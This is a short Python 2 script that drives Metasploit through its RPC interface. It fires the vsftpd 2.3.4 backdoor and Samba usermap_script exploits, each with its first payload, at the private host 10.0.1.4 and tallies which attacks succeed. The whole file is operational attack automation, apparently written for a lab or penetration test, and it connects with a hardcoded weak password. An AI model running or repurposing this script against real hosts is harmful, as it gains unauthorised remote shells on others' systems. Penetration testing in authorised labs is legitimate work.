from metasploit.msfrpc import MsfRpcClient
from metasploit.msfconsole import MsfRpcConsole
# get the repository
# git clone https://github.com/allfro/pymetasploit
# python version 2.7
import time
client = MsfRpcClient('password')
# commands = client.modules.exploits
commands = ['unix/ftp/vsftpd_234_backdoor', 'multi/samba/usermap_script']
targethost = '10.0.1.4'

size = len(commands)
print 'in total ' + str(size) + ' attacks are going to test'
successcount = 0
failcount = 0
for command in commands:
    exploit = client.modules.use('exploit', command)

    exploit['RHOSTS'] = targethost
    print exploit.payloads
    data = exploit.execute(payload = exploit.payloads[0])
    if data['job_id']  == None:
        failcount += 1
        print command + ' with payload of ' + exploit.payloads[0] + ' attack fails'
    else:
        successcount += 1
        print command +  ' with payload of ' + exploit.payloads[0] +' attack succeeds'

print 'in total ' + str(successcount) + ' attacks succeeds'
print 'in total ' + str(failcount) + ' attacks fails'